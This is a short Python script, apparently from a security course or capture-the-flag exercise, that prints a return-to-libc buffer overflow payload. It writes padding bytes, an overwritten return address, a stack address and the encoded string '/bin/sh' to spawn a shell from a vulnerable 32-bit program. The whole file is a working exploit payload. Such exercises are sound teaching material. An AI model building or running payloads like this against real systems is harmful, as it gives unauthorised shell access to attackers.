from shellcode import shellcode
import sys
sys.stdout.buffer.write(b'A'*22)
sys.stdout.buffer.write(0x0804fef0.to_bytes(4, 'little'))
sys.stdout.buffer.write(b'A'*4)
sys.stdout.buffer.write(0xFFF6E9E8.to_bytes(4, 'little'))
sys.stdout.buffer.write(b'\x2f\x62\x69\x6e\x2f\x73\x68\x0a')

#sys.stdout.buffer.write(b'A'*6)

#sys.stdout.buffer.write(b'\x00')
#8 total bytes